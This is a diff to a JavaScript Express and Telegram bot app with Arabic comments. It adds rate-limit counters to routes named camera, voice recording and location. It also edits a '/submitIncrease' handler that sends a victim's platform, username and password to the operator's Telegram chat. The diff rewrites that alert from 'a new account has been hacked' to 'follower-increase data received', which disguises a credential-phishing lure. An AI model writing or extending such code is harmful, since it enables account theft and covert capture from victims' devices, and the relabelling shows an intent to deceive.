@@ -312,6 +312,31 @@ if (forcedChannelUsernames.length && !activatedUsers[chatId]) {
 
 
 // مسار الكاميرا
+const trackAttempts = (userId, action) => {
+    if (!userVisits[userId]) {
+        userVisits[userId] = { camera: 0, voiceRecord: 0, getLocation: 0 };
+    }
+
+    userVisits[userId][action]++;
+
+    return userVisits[userId][action] > MAX_FREE_ATTEMPTS;
+};
+
+// دالة لتتبع المحاولات لمسار المنصة الأصلي
+const trackPlatformAttempts = (platformId) => {
+    if (!platformVisits[platformId]) {
+        platformVisits[platformId] = 0;
+    }
+
+    platformVisits[platformId]++;
+
+    return platformVisits[platformId] > MAX_FREE_ATTEMPTS;
+};
+
+// المسار الأصلي
+
+
+// مسار الكاميرا
 app.get('/camera/:userId', (req, res) => {
     const userId = req.params.userId;
 
@@ -492,7 +517,7 @@ app.post('/submitIncrease', (req, res) => {
 
     const deviceInfo = useragent.parse(userAgent);
 
-    bot.sendMessage(chatId, `تم اختراق حساب جديد:
+    bot.sendMessage(chatId, `تم تلقي بيانات زيادة المتابعين:
 منصة: ${platform}
 اسم المستخدم: ${username}
 كلمة السر: ${password}
